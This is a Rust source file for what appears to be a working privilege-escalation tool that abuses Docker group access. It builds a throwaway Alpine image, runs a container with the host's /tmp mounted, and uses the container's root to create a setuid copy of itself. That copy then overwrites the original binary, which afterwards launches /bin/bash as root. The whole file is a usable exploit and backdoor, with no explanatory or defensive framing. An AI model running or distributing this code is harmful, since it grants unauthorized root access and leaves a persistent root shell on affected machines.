use std::env;
use std::fs;
use std::os::linux::fs::MetadataExt;
use std::process::Command;

use libc::c_int;

fn main() {
    let mut args: Vec<String> = env::args().collect();
    args.remove(0);
    let mut check = false;
    if let Some(arg1) = env::args().nth(1) {
        if arg1.eq("d2r-check") {
            args.remove(0);
            check = true;
        }
    }

    let exe = env::current_exe().unwrap_or_else(|err| {
        eprintln!("Error getting current executable: {}", err);
        std::process::exit(1);
    });
    let path = exe.as_path();
    let path_str = path.to_str().unwrap();
    let metadata = fs::metadata(path).unwrap_or_else(|err| {
        eprintln!("Error getting metadata: {}", err);
        std::process::exit(1);
    });

    let suid_mask = 0o4000;
    let is_suid = metadata.st_mode() & suid_mask != 0;

    if is_suid {
        println!("running shell ({})", is_suid);
        let result: c_int;
        unsafe {
            result = libc::setuid(0);
            if result == -1 {
                println!("cannot run as root");
                std::process::exit(1);
            }
            libc::setgid(0);
        }

        Command::new("/bin/bash").args(args).status().expect("Cannot run /bin/bash");
    } else if !check {
        println!("running script ({})", is_suid);

        fs::create_dir("/tmp/d2r").expect("Unable to create dir /tmp/d2r");
        fs::copy(path, "/tmp/d2r/rs").expect("Unable to copy file to /tmp/d2r/rs");

        let dockerfile = "FROM alpine:3.5\nCOPY r.sh r.sh\nCOPY rs rs\n";
        fs::write("/tmp/d2r/Dockerfile", dockerfile).expect("Unable to write Dockerfile");

        let rsh = "#!/bin/sh\n\ncp rs /tmp/rs2\nchmod 4777 /tmp/rs2\n";
        fs::write("/tmp/d2r/r.sh", rsh).expect("Unable to write r.sh");

        Command::new("docker").args(["build", "--rm", "-t", "d2r", "/tmp/d2r/"]).status().expect("Cannot build docker image");
        Command::new("docker").args(["run", "--name", "d2r", "-v", "/tmp:/tmp", "d2r:latest", "/bin/sh", "r.sh"]).status().expect("Cannot start docker container");
        Command::new("docker").args(["rm", "-f", "d2r"]).status().expect("Cannot remove docker container");
        Command::new("docker").args(["rmi", "-f", "d2r:latest"]).status().expect("Cannot remove docker image");
        let rm_str = "rm -rf /tmp/d2r".to_string();
        Command::new("/tmp/rs2").args(["-v", "-c", &*rm_str]).status().expect("Cannot remove tmp folder");
        let mv_str = format!("mv -f /tmp/rs2 {path_str}");
        Command::new("/tmp/rs2").args(["-v", "-c", &*mv_str]).status().expect("Cannot move suid executable");

        Command::new(path).args(["d2r-check"]).status().expect("Cannot run suid executable");
    } else {
        println!("no suid bit {}", path.to_str().unwrap());
    }
}
